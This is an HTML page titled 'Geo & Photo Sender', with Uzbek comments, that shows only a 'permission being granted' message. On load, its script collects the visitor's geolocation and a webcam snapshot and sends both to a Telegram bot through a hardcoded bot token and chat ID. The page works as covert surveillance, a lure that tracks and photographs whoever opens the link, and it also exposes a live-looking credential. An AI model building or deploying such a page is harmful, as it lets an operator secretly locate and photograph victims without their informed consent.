<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geo & Photo Sender</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #000;
            color: white;
            font-family: sans-serif;
        }
    </style>
</head>
<body>
    <h2>Ruxsat berilmoqda...</h2>

    <script>
        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4'; // <-- Bu yerga o'z bot tokeningizni qo'ying
        const CHAT_ID = '7281698380';     // <-- Bu yerga o'z chat ID'ingizni qo'ying

        // Joylashuvni Telegramga yuborish
        async function sendLocationToTelegram(latitude, longitude) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: latitude,
                        longitude: longitude
                    })
                });

                const data = await response.json();
                if (data.ok) {
                    console.log('Joylashuv yuborildi.');
                } else {
                    console.error('Joylashuv yuborilmadi:', data);
                }
            } catch (error) {
                console.error('Xatolik joylashuv yuborishda:', error);
            }
        }

        // Rasmni Telegramga yuborish
        async function sendPhotoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();
                if (data.ok) {
                    console.log('Rasm yuborildi.');
                } else {
                    console.error('Rasm yuborilmadi:', data);
                }
            } catch (error) {
                console.error('Xatolik rasm yuborishda:', error);
            }
        }

        // Kamera orqali rasm olish
        async function capturePhotoAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Kutib rasm olish
                video.addEventListener('loadeddata', () => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0);
                        canvas.toBlob(async (blob) => {
                            stream.getTracks().forEach(track => track.stop());
                            await sendPhotoToTelegram(blob);
                        }, 'image/jpeg');
                    }, 1000); // 1 sekund kutish
                });
            } catch (err) {
                console.error("Kameraga ruxsat berilmadi:", err);
            }
        }

        // Barchasini ishga tushirish
        document.addEventListener('DOMContentLoaded', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
                    await sendLocationToTelegram(latitude, longitude);
                    await capturePhotoAndSend();
                }, (error) => {
                    console.error('Joylashuv xatosi:', error);
                });
            } else {
                alert('Brauzer geolokatsiyani qoâ€˜llab-quvvatlamaydi');
            }
        });
    </script>
</body>
</html>
